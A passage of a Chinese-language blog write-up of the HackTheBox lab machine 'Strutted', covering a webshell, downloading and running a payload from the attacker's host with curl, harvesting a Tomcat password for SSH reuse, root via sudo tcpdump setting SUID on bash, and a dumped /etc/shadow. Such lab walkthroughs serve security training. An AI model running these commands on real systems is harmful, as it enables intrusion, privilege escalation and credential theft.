+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092528-cxecjjh.png" alt="image">​</p>
+<p>這樣就得到了一個 webshell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://strutted.htb/webshell.jsp?action=cmd&amp;cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092616-lisv9qd.png" alt="image">​</p>
+<p>然後就是老樣子上傳一個馬：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://strutted.htb/webshell.jsp?action=cmd&amp;cmd=curl%<span class="number">2010.10</span><span class="number">.16</span><span class="number">.31</span>/mane%<span class="number">20</span>-o%<span class="number">20</span>/tmp/mane</span><br><span class="line">http://strutted.htb/webshell.jsp?action=cmd&amp;cmd=chmod%<span class="number">20777</span>%<span class="number">20</span>/tmp/mane</span><br><span class="line">http://strutted.htb/webshell.jsp?action=cmd&amp;cmd=/tmp/mane</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-tomcat"><a href="#Shell-as-tomcat" class="headerlink" title="Shell as tomcat"></a>Shell as tomcat</h1><p>拿到了 shell 之後發現是 <code>tomcat</code>​ 這個用戶，因爲一開始下載源碼的時候有 <code>Dockerfile</code>​，所以猜測當前是在容器中，既然是這樣那就看一下 <code>/etc/passwd</code>​：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093044-9i0a6lx.png" alt="image">​</p>
+<p>看到有一個  <code>james</code>​的用戶，然後枚舉一下 tomcat 配置文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093335-hknv3jw.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093351-649mu3p.png" alt="image">​</p>
+<p>找到了一個後臺的密碼 <code>IT14d6SSP81k</code>​：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;IT14d6SSP81k&quot;</span> roles=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-james"><a href="#Shell-as-james" class="headerlink" title="Shell as james"></a>Shell as james</h1><p>所以嘗試使用 ssh 登陸一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh james@<span class="number">10.129</span><span class="number">.231</span><span class="number">.200</span> : IT14d6SSP81k</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093421-f6l0u3t.png" alt="image">​</p>
+<p>結果獲得了 <code>user.txt</code>​。</p>
+<h2 id="Exploit-sudo-for-tcpdump"><a href="#Exploit-sudo-for-tcpdump" class="headerlink" title="Exploit sudo for tcpdump"></a>Exploit sudo for tcpdump</h2><p>上來第一件事情就是檢查一下 <code>sudo -l</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093450-noe559w.png" alt="image">​</p>
+<p>看到有 <code>/usr/sbin/tcpdump</code>​允許使用 root 的用戶運行，查一下 gtfobins ，看到：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tcpdump/">https://gtfobins.github.io/gtfobins/tcpdump/</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124101334-lpp07z2.png" alt="image">​</p>
+<p>根據上面的文檔只需要把 <code>COMMAND</code>​ 改一下就可以以 root 的身份運行，把 bash 加個 suid 就得到了 root：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;chmod 4777 /bin/bash&#x27;</span></span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo <span class="string">&quot;$COMMAND&quot;</span> &gt; $TF</span><br><span class="line">chmod +x $TF</span><br><span class="line">sudo tcpdump -ln -i lo -w /dev/null -W <span class="number">1</span> -G <span class="number">1</span> -z $TF -Z root</span><br><span class="line"></span><br><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093651-zk2mfnl.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">bash-<span class="number">5.1</span><span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:<span class="number">20100</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">bin</span>:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sys:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">man:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">news:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uucp:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">proxy:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">www-data:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">backup:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">list</span>:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">irc:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">gnats:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_apt:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-resolve:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">messagebus:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-timesync:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">pollinate:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sshd:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">syslog:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uuidd:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">tcpdump:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">tss:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">landscape:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">fwupd-refresh:*:<span class="number">19405</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">usbmux:*:<span class="number">19474</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lxd:!:<span class="number">19474</span>::::::</span><br><span class="line">tomcat:!*:<span class="number">20095</span>::::::</span><br><span class="line">james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8<span class="number">.59</span>:<span class="number">20100</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_laurel:!:<span class="number">20103</span>::::::</span><br><span class="line">bash-<span class="number">5.1</span><span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#97;&#110;&#101;&#64;&#x6d;&#97;&#x6e;&#x65;&#115;&#101;&#99;&#x2e;&#x63;&#x6f;&#109;">&#x6d;&#97;&#110;&#101;&#64;&#x6d;&#97;&#x6e;&#x65;&#115;&#101;&#99;&#x2e;&#x63;&#x6f;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#109;&#x61;&#x6e;&#101;&#64;&#x6d;&#97;&#110;&#x65;&#x73;&#x65;&#x63;&#x2e;&#99;&#x6f;&#x6d;">&#109;&#x61;&#x6e;&#101;&#64;&#x6d;&#97;&#110;&#x65;&#x73;&#x65;&#x63;&#x2e;&#99;&#x6f;&#x6d;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 完成 <code>INTRODUCTION TO ACADEMY</code> 這個模塊后可以解鎖更多的功能！</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&text=HackTheBox - Machine - Strutted"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&is_video=false&description=HackTheBox - Machine - Strutted"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Strutted&body=Check out this article: https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&name=HackTheBox - Machine - Strutted&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&t=HackTheBox - Machine - Strutted"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
